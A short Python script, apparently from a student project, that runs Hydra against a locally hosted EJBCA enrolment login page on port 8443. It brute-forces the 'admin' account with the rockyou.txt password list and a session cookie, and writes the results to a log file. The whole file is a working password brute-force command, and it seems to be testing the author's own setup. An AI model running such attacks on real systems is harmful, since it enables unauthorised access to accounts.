import os
import sys
import apt
import subprocess

path = "/home/ihsanfr/Kode_TA_Ihsan/tesbruteforce.log"
sys.stdout = open(path, "w")
command = 'hydra 127.0.0.1 -l admin -s 8443 -P /home/ihsanfr/Downloads/rockyou.txt http-get-form "/ejbca/enrol/browser.jsp:username=^USER^&password=^PASS^&Login=Login:Wrong username, enrollment code or user status:H=Cookie: JSESSIONID=MRZa5FCT1pAeLo5bgbsOYYPNZ62y6ccXQqUeIdNE.ihsanfr-x555qg"'
r = os.popen(command)
info = r.readlines()
for line in info:  
    line = line.strip('\r\n')
    print(line)